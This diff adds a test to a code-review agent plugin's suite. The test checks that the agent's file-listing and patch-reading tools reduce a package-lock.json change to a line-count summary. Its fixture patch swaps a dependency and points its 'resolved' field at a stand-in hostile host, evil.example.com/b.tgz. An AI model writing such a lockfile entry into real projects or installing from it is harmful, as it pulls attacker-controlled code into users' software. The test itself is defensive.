@@ -149,3 +149,15 @@ test("with every toggle off, list_review_files marks no test weakened and the as
   const { assistantInstructions } = await import("./agent");
   expect(assistantInstructions("pr-1", null, store.getPreferences().preferences)).not.toContain("weakened");
 });
+
+test("with every toggle off, list_review_files and a page's stub show a lockfile without its digest", async () => {
+  const { bb, harness, store } = host();
+  await plugin(bb);
+  store.savePatch("pr-1", "diff --git a/package-lock.json b/package-lock.json\n--- a/package-lock.json\n+++ b/package-lock.json\n@@ -1 +1,2 @@\n-    \"node_modules/a\": {\n+    \"node_modules/b\": {\n+      \"resolved\": \"https://evil.example.com/b.tgz\",\n");
+  store.setAssistantThread("pr-1", "assistant");
+  const listed = JSON.stringify(await harness.behavior.callAgentTool("list_review_files", { targetKey: "pr-1" }, { threadId: "assistant" }));
+  const paged = JSON.stringify(await harness.behavior.callAgentTool("read_review_patch", { targetKey: "pr-1" }, { threadId: "assistant" }));
+  expect(listed).toContain("package-lock.json · modified");
+  expect(paged).toContain("[lockfile: +2 −1 lines; pass file to read it]");
+  for (const text of [listed, paged]) expect(text).not.toMatch(/packages|evil\.example\.com/);
+});
